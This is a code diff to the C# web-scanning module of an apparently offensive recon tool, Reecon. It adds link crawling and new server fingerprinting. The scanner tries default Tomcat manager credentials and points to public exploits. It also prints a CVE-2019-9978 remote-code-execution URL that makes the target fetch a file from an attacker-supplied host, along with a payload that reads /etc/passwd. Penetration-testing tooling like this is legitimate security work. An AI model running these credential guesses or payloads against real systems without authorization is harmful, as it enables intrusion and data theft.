@@ -9,6 +9,7 @@ using System.Net.Http;
 using System.Net.Http.Headers;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
+using System.Text;
 using System.Text.Json;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
@@ -18,6 +19,7 @@ namespace Reecon
     class Web
     {
         static string scanURL = "";
+        static List<string> fullPageList = new List<string>();
         public static void GetInfo(string[] args)
         {
             if (args.Length != 2)
@@ -34,14 +36,17 @@ namespace Reecon
 
             Console.WriteLine("Scanning...");
 
+            // First - Scan the base page
             var httpInfo = Web.GetHTTPInfo(scanURL);
             string pageText = httpInfo.PageText;
             string pageInfo = FindInfo(pageText);
+            pageInfo += FindLinks(pageText); // Todo: Recursive
+            // TODO: Auto SQLi - Web.GetInfo(new[] { "-web", "http://testphp.vulnweb.com/" });
             if (pageInfo.Trim() != "")
             {
                 Console.WriteLine(pageInfo);
             }
-            Console.WriteLine(FormatHTTPInfo(httpInfo.StatusCode, httpInfo.PageTitle, httpInfo.PageText, httpInfo.DNS, httpInfo.Headers, httpInfo.SSLCert, httpInfo.URL));
+            Console.WriteLine(ParseHTTPInfo(httpInfo.StatusCode, httpInfo.PageTitle, httpInfo.PageText, httpInfo.DNS, httpInfo.Headers, httpInfo.SSLCert, httpInfo.URL));
 
             // Then find common files
             Console.WriteLine("Searching for common files...");
@@ -54,17 +59,11 @@ namespace Reecon
             Console.WriteLine("Web Info Scan Finished");
         }
 
-        public static void ScanPage(string url)
-        {
-
-        }
-
         public static string FindInfo(string pageText, bool doubleDash = false)
         {
             string foundInfo = "";
             foundInfo += FindFormData(pageText);
             foundInfo += FindEmails(pageText, doubleDash);
-            foundInfo += FindLinks(pageText, doubleDash);
             return foundInfo.Trim(Environment.NewLine.ToCharArray());
         }
 
@@ -154,9 +153,9 @@ namespace Reecon
             return returnInfo;
         }
 
-        private static string FindLinks(string pageText, bool doubleDash)
+        private static string FindLinks(string pageText, bool doubleDash = false)
         {
-            List<string> linkList = new List<string>();
+            List<string> currentPageList = new List<string>();
             // Find all matches
             MatchCollection m1 = Regex.Matches(pageText, @"(<a.*?>.*?</a>)", RegexOptions.Singleline);
 
@@ -181,35 +180,50 @@ namespace Reecon
                     if (scanURL.EndsWith("/"))
                     {
                         href = scanURL + href.TrimStart('/');
+                        if (!href.StartsWith(scanURL))
+                        {
+                            href = scanURL + href;
+                        }
                     }
                 }
                 if (href.Length > 1 && !href.StartsWith("#")) // Section - Not actual URL
                 {
-                    if (doubleDash)
+                    string info = doubleDash ? "-- " : "- ";
+                    info += $"{text}: {href}";
+                    if (!currentPageList.Contains(info))
                     {
-                        string info = "-- " + text + ": " + href;
-                        if (!linkList.Contains(info))
+                        currentPageList.Add(info);
+                        Uri parentURL = new Uri(scanURL);
+                        if (href.StartsWith("http"))
                         {
-                            linkList.Add(info);
+                            Uri theURL = new Uri(href);
+                            // Don't add off-host link
+                            if (theURL.Host == parentURL.Host)
+                            {
+                                fullPageList.Add(theURL.PathAndQuery);
+                            }
                         }
-                    }
-                    else
-                    {
-                        string info = "- " + text + ": " + href;
-                        if (!linkList.Contains(info))
+                        else
                         {
-                            linkList.Add(info);
+                            fullPageList.Add(href);
                         }
                     }
                 }
+
             }
             // Convert to a nice string to return
             string returnInfo = "";
-            foreach (string item in linkList)
+            foreach (string page in currentPageList)
             {
-                returnInfo += item + Environment.NewLine;
+                returnInfo += page + Environment.NewLine;
             }
             return returnInfo.Trim(Environment.NewLine.ToCharArray());
+        }
+
+        private static void FindNewPages(string pageToScan)
+        {
+            var pageText = GetHTTPInfo(pageToScan).PageText;
+            FindLinks(pageText, false);
         }
 
         public static string FindCommonFiles(string url)
@@ -401,7 +415,7 @@ namespace Reecon
                                 // https://github.com/arthaud/git-dumper/issues/9
                                 try
                                 {
-                                    if (General.DownloadString($"{url}.git/").Contains("../"))
+                                    if (DownloadString($"{url}.git/").Contains("../"))
                                     {
                                         // -q: Quiet (So the console doesn't get spammed)
                                         // -r: Download everything
@@ -431,7 +445,7 @@ namespace Reecon
                                 try
                                 {
                                     string toCheck = $"{url}{file}";
-                                    string pageData = General.DownloadString($"{url}{file}");
+                                    string pageData = DownloadString($"{url}{file}");
                                     if (pageData.IndexOf("&quot;version&quot;:&quot;") != -1)
                                     {
                                         string versionText = pageData.Remove(0, pageData.IndexOf("&quot;version&quot;:&quot;") + 26);
@@ -562,7 +576,7 @@ namespace Reecon
                     returnText += "-- Docker Detected - API Version: " + dockerVersion + Environment.NewLine;
                     if (dockerVersion == "registry/2.0")
                     {
-                        string repoText = General.DownloadString($"{url}v2/_catalog");
+                        string repoText = DownloadString($"{url}v2/_catalog");
                         if (repoText.Contains("repositories"))
                         {
                             try
@@ -571,7 +585,7 @@ namespace Reecon
                                 foreach (var item in repoList.RootElement.GetProperty("repositories").EnumerateArray())
                                 {
                                     returnText += "--- Repo Found: " + item + Environment.NewLine;
-                                    string tagList = General.DownloadString($"{url}v2/" + item + "/tags/list");
+                                    string tagList = DownloadString($"{url}v2/" + item + "/tags/list");
                                     tagList = tagList.Replace("\r", "").Replace("\n", ""); // Sometimes has a built in newline for some reason
                                     returnText += "---- Tags Found: " + tagList + Environment.NewLine;
                                     // /v2/cmnatic/myapp1/tags/list
@@ -676,7 +690,7 @@ namespace Reecon
             return (statusCode, pageTitle, pageText, dns, headers, cert, url, null);
         }
 
-        public static string FormatHTTPInfo(HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, HttpResponseHeaders Headers, X509Certificate2 SSLCert, string URL)
+        public static string ParseHTTPInfo(HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, HttpResponseHeaders Headers, X509Certificate2 SSLCert, string URL)
         {
             string urlPrefix = URL.StartsWith("https") ? "https" : "http";
             string responseText = "";
@@ -752,7 +766,7 @@ namespace Reecon
                         responseText += "- Manager (Status) Found - But it requires credentials --> " + managerStatusURL + Environment.NewLine;
                         try
                         {
-                            General.DownloadString(managerStatusURL, Creds: defaultTomcatCreds);
+                            DownloadString(managerStatusURL, Creds: defaultTomcatCreds);
                             responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
                         }
                         catch
@@ -777,7 +791,7 @@ namespace Reecon
                         responseText += "- Manager App (HTML) Found - But it requires credentials --> " + managerAppHTMLURL + Environment.NewLine;
                         try
                         {
-                            General.DownloadString(managerAppHTMLURL, Creds: defaultTomcatCreds);
+                            DownloadString(managerAppHTMLURL, Creds: defaultTomcatCreds);
                             responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
                         }
                         catch
@@ -802,7 +816,7 @@ namespace Reecon
                         responseText += "- Manager App (Text) Found - But it requires credentials --> " + managerAppTextURL + Environment.NewLine;
                         try
                         {
-                            General.DownloadString(managerAppTextURL, Creds: defaultTomcatCreds);
+                            DownloadString(managerAppTextURL, Creds: defaultTomcatCreds);
                             responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
                         }
                         catch
@@ -827,7 +841,7 @@ namespace Reecon
                         responseText += "- Host Manager Found - But it requires credentials --> " + hostManagerURL + Environment.NewLine;
                         try
                         {
-                            General.DownloadString(hostManagerURL, Creds: defaultTomcatCreds);
+                            DownloadString(hostManagerURL, Creds: defaultTomcatCreds);
                             responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
                         }
                         catch
@@ -938,13 +952,33 @@ namespace Reecon
                     }
                 }
                 // All the X's
+                if (Headers.Any(x => x.Key.StartsWith("X-Generator")))
+                {
+                    string generator = Headers.GetValues("X-Generator").First();
+                    Headers.Remove("X-Powered-By");
+                    responseText += "- X-Generator: " + generator + Environment.NewLine;
+
+                    if (generator.StartsWith("Drupal"))
+                    {
+                        responseText += "-- Drupal Detected" + Environment.NewLine;
+                        responseText += $"--- Run: droopescan scan drupal -u {urlPrefix}://{DNS}/" + Environment.NewLine;
+                    }
+                }
                 if (Headers.Any(x => x.Key == "X-Powered-By"))
                 {
                     string poweredBy = Headers.GetValues("X-Powered-By").First();
                     Headers.Remove("X-Powered-By");
-
-                    // JBoss
                     responseText += "- X-Powered-By: " + poweredBy + Environment.NewLine;
+
+                    if (poweredBy.Contains("PHP"))
+                    {
+                        responseText += "-- PHP Detected" + Environment.NewLine;
+                        if (poweredBy.Contains("/8.1.0-dev"))
+                        {
+                            responseText += "--- " + "Vulnerable PHP Version (PHP/8.1.0-dev) Detected - https://www.exploit-db.com/raw/49933 <-----".Pastel(Color.Orange) + Environment.NewLine;
+                        }
+                    }
+                    // JBoss
                     if (poweredBy.Contains("JBoss"))
                     {
                         responseText += "-- " + "JBoss Detected - Run jexboss - https://github.com/joaomatosf/jexboss <-----".Pastel(Color.Orange) + Environment.NewLine;
@@ -994,9 +1028,9 @@ namespace Reecon
                         var versionData = JsonDocument.Parse(versionCheck.PageText);
                         string major = versionData.RootElement.GetProperty("major").GetString();
                         string minor = versionData.RootElement.GetProperty("minor").GetString();
-                        responseText += $"--" + "Version: {major}.{minor} (In /version)".Pastel(Color.Orange) + Environment.NewLine;
+                        responseText += $"-- " + "Version: {major}.{minor} (In /version)".Pastel(Color.Orange) + Environment.NewLine;
                     }
-                    responseText += "---" + "Try get /run/secrets/kubernetes.io/serviceaccount/token" + Environment.NewLine;
+                    responseText += "--- " + "Try get /run/secrets/kubernetes.io/serviceaccount/token" + Environment.NewLine;
                     responseText += "--- " + "If you do, read: https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" + Environment.NewLine;
 
                 }
@@ -1259,8 +1293,9 @@ namespace Reecon
                     }
                     else if (PageText.Contains("/wp-content/plugins/social-warfare"))
                     {
-                        responseText += "-- " + "Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Pastel(Color.Orange) + $" - http://192.168.56.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
+                        responseText += "-- " + "Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Pastel(Color.Orange) + $" - {urlPrefix}://{DNS}/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
                         responseText += "--- rce.txt: <pre>system('cat /etc/passwd')</pre>" + Environment.NewLine;
+                        responseText += $"--- Verify Version: {urlPrefix}://{DNS}/wordpress/wp-content/plugins/social-warfare/readme.txt - Scroll down to Changelog" + Environment.NewLine;
                     }
 
                     // Check for public folders
@@ -1383,6 +1418,40 @@ namespace Reecon
                 // Nope
                 return false;
             }
+        }
+
+        public static string DownloadString(string url, string Cookie = "", NetworkCredential Creds = null, string UserAgent = "")
+        {
+            // Note: This cannot go at the top due to the various custom values being set for it
+            HttpClient httpClient = new HttpClient();
+            string toReturn = "";
+            HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url);
+            // Cookie
+            if (Cookie != "")
+            {
+                request.Headers.Add("Cookie", Cookie);
+            }
+
+            // Creds
+            if (Creds != null)
+            {
+                string auth = "Basic " + Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(Creds.UserName + ":" + Creds.Password));
+                request.Headers.Add("Authorization", auth);
+            }
+
+            // UserAgent
+            if (UserAgent != "")
+            {
+                request.Headers.Add("User-Agent", UserAgent);
+            }
+            using (HttpResponseMessage response = httpClient.Send(request))
+            {
+                using (StreamReader readStream = new(response.Content.ReadAsStream()))
+                {
+                    toReturn = readStream.ReadToEnd();
+                }
+            }
+            return toReturn;
         }
     }
 }
